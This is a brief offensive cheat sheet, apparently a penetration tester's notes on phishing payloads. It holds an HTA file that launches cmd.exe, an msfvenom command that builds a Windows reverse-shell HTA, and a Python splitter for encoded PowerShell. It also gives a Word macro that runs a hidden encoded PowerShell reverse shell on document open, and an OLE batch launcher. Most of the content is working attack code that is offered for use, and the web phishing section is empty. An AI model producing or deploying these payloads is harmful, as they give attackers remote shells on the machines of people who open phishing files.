# Phishing Some Fish

## Client Fingerprinting

[FingerprintJS](https://github.com/fingerprintjs/fingerprintjs)

## HTML Applications

File: index.hta

``` hta
<html>
<body>
	<script>

	var c= 'cmd.exe'
	
	new ActiveXObject('WScript.Shell').Run(c);

	</script>
</body>
</html>
```

File: evil.hta

``` bash
sudo msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f hta-psh -o /var/www/html/evil.hta
```

## Microsoft Office

### Microsoft Word Macro

``` python
str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad..."

n = 50

for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'
```

``` bash
Sub AutoOpen()
	ReverseShell
End Sub

Sub Document_Open()
	ReverseShell
End Sub

Sub ReverseShell()
	Dim Str As String

	Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
	Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
	...
	Str = Str + "yAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnA"
	Str = Str + "G4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFM"
	Str = Str + "AdABhAHIAdAAoACQAcwApADsA"

	CreateObject("Wscript.Shell").Run Str
End Sub
```

### Object Linking and Embedding

ReverseShell.bat

``` bat
START powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad...
```

## Web Phishing

``` bash

```